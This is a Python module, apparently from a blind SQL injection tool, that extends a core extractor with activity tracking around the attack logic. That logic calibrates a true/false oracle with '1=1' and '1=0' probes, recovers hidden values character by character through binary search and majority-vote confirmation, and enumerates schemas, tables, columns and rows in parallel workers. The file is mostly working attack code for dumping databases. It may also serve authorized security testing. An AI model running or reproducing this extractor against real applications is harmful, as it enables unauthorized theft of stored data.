from __future__ import annotations

import itertools
import threading
import time
from collections.abc import Callable, Iterator, Sequence
from contextlib import contextmanager
from typing import TypeVar

from .extractor_core import (
    BlindExtractor as CoreBlindExtractor,
    CalibrationError,
    ExtractionError,
    ExtractorConfig,
    protect_sensitive_value,
)
from .models import ExtractionJob, ProbeResult, Table

T = TypeVar("T")
R = TypeVar("R")

_CHARACTER_INFERENCE_ATTEMPTS = 3


def _job_activity(job: object) -> tuple[str, str]:
    if isinstance(job, ExtractionJob):
        expression = job.expression.casefold()
        if "schema_name" in expression or "pragma_database_list" in expression:
            slot = int(job.key) + 1 if job.key.isdigit() else job.key
            return "Extract schema name", f"schema slot {slot}"
        if "table_name" in expression or "sqlite_schema" in expression:
            return "Extract table name", job.key
        if "column_name" in expression or "pragma_table_info" in expression:
            return "Extract column name", job.key
        return "Extract value", job.key
    if isinstance(job, str):
        return "Count tables", job
    if isinstance(job, tuple) and len(job) >= 4:
        return "Count columns", f"{job[2]}.{job[3]}"
    return "Concurrent task", str(job)


class BlindExtractor(CoreBlindExtractor):
    """Core extractor with typed, multi-worker activity events."""

    def __init__(self, *args: object, **kwargs: object) -> None:
        super().__init__(*args, **kwargs)
        self._activity_counter = itertools.count(1)
        self._activity_lock = threading.Lock()
        self._activity_local = threading.local()

    def _stack(self) -> list[dict[str, object]]:
        value = getattr(self._activity_local, "stack", None)
        if value is None:
            value = []
            self._activity_local.stack = value
        return value

    def _current(self) -> dict[str, object] | None:
        stack = self._stack()
        return stack[-1] if stack else None

    def _payload(self, value: dict[str, object]) -> dict[str, object]:
        return {key: item for key, item in value.items() if not key.startswith("_")}

    @contextmanager
    def activity(
        self,
        operation: str,
        target: str,
        *,
        detail: str = "starting",
        kind: str = "extraction",
    ) -> Iterator[None]:
        with self._activity_lock:
            identifier = f"activity:{self.events.scan_id}:{next(self._activity_counter)}"
        started = time.monotonic()
        value: dict[str, object] = {
            "id": identifier,
            "operation": operation,
            "target": target,
            "detail": detail,
            "kind": kind,
            "status": "running",
            "worker": threading.current_thread().name,
            "requests_used": self.client.requests_used,
            "_last": 0.0,
        }
        stack = self._stack()
        stack.append(value)
        self._emit("activity.started", activity=self._payload(value))
        try:
            yield
        except Exception as exc:
            value.update(
                status="failed",
                detail=str(exc)[:240],
                elapsed_seconds=round(time.monotonic() - started, 6),
                requests_used=self.client.requests_used,
            )
            self._emit("activity.failed", activity=self._payload(value))
            raise
        else:
            value.update(
                status="completed",
                elapsed_seconds=round(time.monotonic() - started, 6),
                requests_used=self.client.requests_used,
            )
            self._emit("activity.completed", activity=self._payload(value))
        finally:
            if stack and stack[-1] is value:
                stack.pop()
            elif value in stack:
                stack.remove(value)

    def _activity_update(self, detail: str, *, force: bool = False, **extra: object) -> None:
        value = self._current()
        if value is None:
            return
        now = time.monotonic()
        value.update(detail=detail, requests_used=self.client.requests_used, **extra)
        if not force and now - float(value.get("_last", 0.0)) < 0.08:
            return
        value["_last"] = now
        self._emit("activity.updated", activity=self._payload(value))

    def _update_activity(self, detail: str, *, force: bool = False, **extra: object) -> None:
        """Compatibility alias used by activity-aware extensions and tests."""
        self._activity_update(detail, force=force, **extra)

    def calibrate(self) -> tuple[ProbeResult, ProbeResult]:
        with self.activity(
            "Calibrate oracle",
            "TRUE condition",
            detail="probing 1=1",
            kind="oracle",
        ):
            true_result = self.probe_condition("1=1")
            self._activity_update(
                f"status {true_result.status_code}, {true_result.body_length} bytes",
                force=True,
            )
        with self.activity(
            "Calibrate oracle",
            "FALSE condition",
            detail="probing 1=0",
            kind="oracle",
        ):
            false_result = self.probe_condition("1=0")
            self._activity_update(
                f"status {false_result.status_code}, {false_result.body_length} bytes",
                force=True,
            )
        if not true_result.matched or false_result.matched:
            raise CalibrationError(
                "Oracle calibration failed. Expected TRUE to match and FALSE not to match. "
                f"TRUE(status={true_result.status_code}, bytes={true_result.body_length}, "
                f"matched={true_result.matched}); FALSE(status={false_result.status_code}, "
                f"bytes={false_result.body_length}, matched={false_result.matched})."
            )
        self._emit(
            "scan.calibrated",
            true_status=true_result.status_code,
            true_bytes=true_result.body_length,
            false_status=false_result.status_code,
            false_bytes=false_result.body_length,
        )
        return true_result, false_result

    def infer_integer_capped(self, expression: str, maximum: int) -> tuple[int, bool]:
        self._activity_update(f"searching integer in range 0..{maximum}", maximum=maximum)
        value, truncated = super().infer_integer_capped(expression, maximum)
        self._activity_update(
            f"resolved integer: {value}{' (limit reached)' if truncated else ''}",
            force=True,
            current=value,
            maximum=maximum,
        )
        return value, truncated

    def _stable_condition(
        self,
        condition: str,
        *,
        initial: ProbeResult | None = None,
    ) -> tuple[bool, list[ProbeResult]]:
        """Return a two-of-three decision, using at least two independent probes."""

        samples = [initial] if initial is not None else []
        while len(samples) < 2:
            samples.append(self.probe_condition(condition))
        if samples[0].matched == samples[1].matched:
            return samples[0].matched, samples
        samples.append(self.probe_condition(condition))
        matched = sum(1 for sample in samples if sample.matched) >= 2
        return matched, samples

    @staticmethod
    def _sample_summary(samples: Sequence[ProbeResult]) -> list[dict[str, object]]:
        return [
            {
                "matched": sample.matched,
                "status_code": sample.status_code,
                "body_length": sample.body_length,
            }
            for sample in samples
        ]

    def _infer_character_code(self, code_expression: str, position: int) -> int:
        candidates: list[int] = []
        confirmations: list[list[dict[str, object]]] = []
        for attempt in range(1, _CHARACTER_INFERENCE_ATTEMPTS + 1):
            self.control.checkpoint()
            low = self.config.min_char_code
            high = self.config.max_char_code

            below_condition = f"({code_expression}) < {low}"
            below_initial = self.probe_condition(below_condition)
            if below_initial.matched:
                below, _ = self._stable_condition(
                    below_condition,
                    initial=below_initial,
                )
                if below:
                    raise ExtractionError(
                        f"Character at position {position} is below --min-char-code ({low})."
                    )

            above_condition = f"({code_expression}) > {high}"
            above_initial = self.probe_condition(above_condition)
            if above_initial.matched:
                above, _ = self._stable_condition(
                    above_condition,
                    initial=above_initial,
                )
                if above:
                    raise ExtractionError(
                        f"Character at position {position} exceeds --max-char-code ({high})."
                    )

            while low < high:
                midpoint = (low + high) // 2
                if self.probe_condition(f"({code_expression}) > {midpoint}").matched:
                    low = midpoint + 1
                else:
                    high = midpoint

            candidate = low
            candidates.append(candidate)
            confirmed, samples = self._stable_condition(
                f"({code_expression}) = {candidate}"
            )
            sample_summary = self._sample_summary(samples)
            confirmations.append(sample_summary)
            if confirmed:
                if attempt > 1:
                    self._emit(
                        "inference.recovered",
                        position=position,
                        attempt=attempt,
                        candidate=candidate,
                        candidates=candidates,
                        confirmation_samples=sample_summary,
                    )
                return candidate

            if attempt < _CHARACTER_INFERENCE_ATTEMPTS:
                self._activity_update(
                    "character confirmation was inconsistent; "
                    f"restarting inference {attempt + 1}/{_CHARACTER_INFERENCE_ATTEMPTS}",
                    force=True,
                    position=position,
                    candidate=candidate,
                    attempt=attempt,
                )
                self._emit(
                    "inference.retry",
                    position=position,
                    attempt=attempt,
                    candidate=candidate,
                    candidates=list(candidates),
                    confirmation_samples=sample_summary,
                )

        raise ExtractionError(
            f"Unable to confirm character at position {position} after "
            f"{_CHARACTER_INFERENCE_ATTEMPTS} complete inference attempts. "
            f"Candidates={candidates}; confirmations={confirmations}."
        )

    def extract_string(self, expression: str, *, maximum_length: int | None = None) -> str:
        created = self._current() is None
        context = (
            self.activity("Extract scalar value", "SQL expression")
            if created
            else _null_activity()
        )
        with context:
            limit = maximum_length or self.config.max_length
            self._activity_update(
                f"measuring value length (limit {limit})", maximum=limit
            )
            length, truncated = self.infer_integer_capped(
                self.dialect.length_expression(expression), limit
            )
            characters: list[str] = []
            for position in range(1, length + 1):
                self.control.checkpoint()
                self._activity_update(
                    f"extracting character {position}/{length}",
                    force=True,
                    current=position,
                    maximum=length,
                    unit="characters",
                )
                code_expression = self.dialect.char_code_expression(expression, position)
                code = self._infer_character_code(code_expression, position)
                characters.append(chr(code))
            value = "".join(characters) + ("…" if truncated else "")
            visible = len(characters)
            suffix = " (truncated)" if truncated else ""
            self._activity_update(
                f"extracted {visible} characters{suffix}",
                force=True,
                current=visible,
                maximum=length,
                unit="characters",
            )
            return value

    def _parallel_map(
        self,
        items: Sequence[T],
        function: Callable[[T], R],
        on_result: Callable[[T, R], None] | None = None,
        activity_factory: Callable[[T, int], tuple[str, str, str]] | None = None,
    ) -> list[R]:
        positions = {id(item): index for index, item in enumerate(items)}

        def tracked(item: T) -> R:
            if activity_factory is None:
                operation, target = _job_activity(item)
                detail = "queued on worker"
            else:
                operation, target, detail = activity_factory(
                    item, positions.get(id(item), 0)
                )
            with self.activity(operation, target, detail=detail):
                return function(item)

        return super()._parallel_map(items, tracked, on_result=on_result)

    def extract_many(
        self,
        jobs: list[ExtractionJob],
        *,
        maximum_length: int | None = None,
        on_result: Callable[[ExtractionJob, str], None] | None = None,
        activity_operation: str | None = None,
        activity_target: Callable[[ExtractionJob, int], str] | None = None,
    ) -> dict[str, str]:
        def extract(job: ExtractionJob) -> str:
            if maximum_length is None:
                return self.extract_string(job.expression)
            return self.extract_string(job.expression, maximum_length=maximum_length)

        factory = None
        if activity_operation is not None:
            factory = lambda job, index: (
                activity_operation,
                activity_target(job, index) if activity_target else job.key,
                "queued on worker",
            )
        values = self._parallel_map(
            jobs, extract, on_result=on_result, activity_factory=factory
        )
        return {job.key: value for job, value in zip(jobs, values, strict=True)}

    def extract_table_rows(
        self,
        schema: str,
        table: Table,
        **kwargs: object,
    ) -> tuple[int, bool, int]:
        with self.activity(
            "Extract bounded rows",
            f"{schema}.{table.name}",
            detail="counting rows and selected columns",
            kind="data",
        ):
            result = super().extract_table_rows(schema, table, **kwargs)
            self._activity_update(
                f"stored {result[0]} rows, {result[2]} bytes",
                force=True,
                current=result[0],
                unit="rows",
            )
            return result


@contextmanager
def _null_activity() -> Iterator[None]:
    yield


__all__ = [
    "BlindExtractor",
    "CalibrationError",
    "ExtractionError",
    "ExtractorConfig",
    "protect_sensitive_value",
]
